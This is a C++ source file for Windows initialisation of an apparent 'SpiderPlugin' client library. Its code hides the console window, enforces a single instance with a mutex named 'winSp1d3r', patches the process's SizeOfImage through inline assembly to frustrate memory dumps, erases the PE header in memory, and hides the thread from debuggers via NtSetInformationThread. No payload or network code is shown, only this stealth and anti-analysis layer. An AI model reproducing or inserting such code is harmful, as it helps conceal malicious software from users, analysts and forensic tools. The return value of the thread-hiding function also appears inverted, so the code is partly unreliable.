#if defined _WIN32

#include <windows.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include "SpiderPlugin.h"

namespace spider
{
namespace client
{
namespace library
{
bool SpiderPlugin::initWindows()
{
	// Hide window
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	// Check if already loaded
	HANDLE hMutex = CreateMutex(NULL, FALSE, "winSp1d3r");
	if (hMutex && GetLastError() != 0) {
		return false;
	}

	// Hide current thread
	hideThreadWindows(GetCurrentThread());

	// Change image size, preventing from memory dump
	std::uint32_t NewSize = (std::rand() & 0x7777) + 0x100000;
	__asm
	{
		mov eax, fs:[0x30] // PEB
		mov eax, [eax + 0x0c] // PEB_LDR_DATA
		mov eax, [eax + 0x0c] // InOrderModuleList
		mov ecx, NewSize
		mov dword ptr[eax + 0x20], ecx // SizeOfImage
	}

	// Remove PE header
	DWORD OldProtect = 0;

	// Get base address of module
	char *pBaseAddr = (char*)GetModuleHandle(NULL);
	// Change memory protection
	VirtualProtect(pBaseAddr, 0x1000, // Assume x86 page size
		PAGE_READWRITE, &OldProtect);
	// Erase the header
	std::memset(pBaseAddr, 0, 0x1000);

    return true;
}

bool SpiderPlugin::hideThreadWindows(void *handleThread) {

	typedef NTSTATUS(NTAPI *pNtSetInformationThread)(HANDLE, UINT, PVOID, ULONG);
	if (!handleThread) {
		return false;
	}
	// Get NtSetInformationThread
	pNtSetInformationThread NtSIT = (pNtSetInformationThread)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtSetInformationThread");

	// Shouldn't fail
	if (!NtSIT)
	{
		return false;
	}
	// 0x11 -> HideFromDebugger
	NTSTATUS Status = NtSIT(handleThread, 0x11, 0, 0);
	return !!Status;
}

bool SpiderPlugin::deinitWindows()
{
	system("pause");
    return false;
}
}
}
}
#endif